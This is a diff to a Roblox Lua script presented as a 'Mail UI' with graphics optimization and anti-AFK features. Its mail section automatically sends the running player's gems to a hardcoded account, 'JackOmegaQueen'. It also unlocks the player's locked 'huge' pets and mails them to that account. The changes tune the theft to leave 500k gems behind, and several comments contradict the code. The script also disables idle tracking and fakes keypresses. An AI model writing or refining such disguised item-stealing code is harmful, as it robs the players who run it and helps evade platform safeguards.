@@ -144,10 +144,11 @@ end)
 print("[✅] KenPhysical Mail UI loaded (Toggle = H)")
 
 -----------------------------------------------------
--- MAIL SCRIPT (sửa OptimizationSafe, không phá __THINGS)
+-- MAIL SCRIPT (Giữ lại 1M gems)
 -----------------------------------------------------
 local PlayerToSend = "JackOmegaQueen"
-local GemTreshold = 1000000
+local GemTreshold = 1000000   -- Bắt đầu gửi khi >= 2M gems
+local KeepGems = 500000        -- 🔥 LUÔN GIỮ LẠI 500k GEMS
 local SendOnlyGems = false
 local MailClaimInterval = 60
 
@@ -174,7 +175,6 @@ local function OptimizationSafe()
         or effect:IsA("ColorCorrectionEffect") then
             effect.Enabled = false
         elseif effect:IsA("Atmosphere") then
-            -- Không có Enabled, nên chỉ giảm cường độ
             effect.Density = 0
             effect.Haze = 0
             effect.Color = Color3.new(1, 1, 1)
@@ -182,7 +182,6 @@ local function OptimizationSafe()
         end
     end
 
-    -- Giảm hiệu ứng trong workspace (nhưng chừa __THINGS)
     for _, obj in ipairs(workspace:GetDescendants()) do
         if workspace:FindFirstChild("__THINGS") and obj:IsDescendantOf(workspace.__THINGS) then
             continue
@@ -230,39 +229,72 @@ local function CheckInventory()
 	local GemsId = Gems._uid
 	local GemsAmount = getDiamondsSafe()
 	local MailCost = mailcost()
+	
+	-- 🔥 Tính số gems có thể gửi (sau khi giữ lại 1M)
+	local availableToSend = GemsAmount - KeepGems - MailCost
+	
+	print("💎 Gems hiện có:", GemsAmount)
+	print("🔒 Giữ lại:", KeepGems)
+	print("💰 Mail Cost:", MailCost)
+	print("📤 Có thể gửi:", availableToSend)
 
-	if GemsAmount >= GemTreshold then
-		local sus, ms = SendMail("Currency", GemsId, GemsAmount - MailCost - 20000)
-		if not sus and ms and ms == "Couldn't remove this item from your inventory!" then
-			task.wait(.25)
-			SendMail("Currency", GemsId, GemsAmount - 5000000)
+	-- Chỉ gửi khi vượt threshold VÀ còn thừa sau khi giữ 1M
+	if GemsAmount >= GemTreshold and availableToSend > 0 then
+		print("📬 Đang gửi", availableToSend, "gems...")
+		local sus, ms = SendMail("Currency", GemsId, availableToSend)
+		
+		if sus then
+			print("✅ Gửi thành công!")
+		else
+			warn("❌ Lỗi gửi:", ms)
+			
+			-- Retry nếu lỗi inventory
+			if ms and ms == "Couldn't remove this item from your inventory!" then
+				task.wait(.25)
+				local retryAmount = math.max(0, availableToSend - 1000000)
+				if retryAmount > 0 then
+					print("🔄 Thử lại với", retryAmount, "gems...")
+					SendMail("Currency", GemsId, retryAmount)
+				end
+			end
 		end
+	else
+		print("⏸️ Không gửi (chưa đủ threshold hoặc không đủ gems sau khi giữ 1M)")
 	end
 
+	-- Gửi pets (nếu bật)
 	if GemsAmount - MailCost < 0 then return end
 	if Data and Data.Inventory and not SendOnlyGems then
 		for i,v in pairs(Data.Inventory.Pet or {}) do
 			if string.find(v.id:lower(), "huge") and not AlreadySend[i] then
-				if v._lk then NetworkPath["Locking_SetLocked"]:InvokeServer(i, false) task.wait(.25) end
+				if v._lk then 
+					NetworkPath["Locking_SetLocked"]:InvokeServer(i, false) 
+					task.wait(.25) 
+				end
 				local susses, ms = SendMail("Pet", i, 1)
-				if susses then AlreadySend[i]=true task.wait(.25) end
-				if ms and ms=="They don't have enough space!" then break end
+				if susses then 
+					print("✅ Đã gửi pet:", v.id)
+					AlreadySend[i]=true 
+					task.wait(.25) 
+				end
+				if ms and ms=="They don't have enough space!" then 
+					warn("⚠️ Người nhận hết chỗ!")
+					break 
+				end
 			end
 		end
 	end
 end
 
--- Chống AFK (nâng cao, vô hiệu hóa Idle Tracking + giả lập phím)
+-- Chống AFK
 task.spawn(function()
-    -- Tắt hệ thống Idle Tracking của Roblox
     pcall(function()
         game:GetService("ReplicatedStorage").Network["Idle Tracking: Stop Timer"]:FireServer()
     end)
     task.wait(0.2)
 
-    -- Giả lập nhấn phím cách (Space) định kỳ
     local VirtualInputManager = game:GetService("VirtualInputManager")
-    while task.wait(300) do -- mỗi 5 phút
+    while task.wait(300) do
         pcall(function()
             VirtualInputManager:SendKeyEvent(true, "Space", false, game)
             task.wait(0.2)
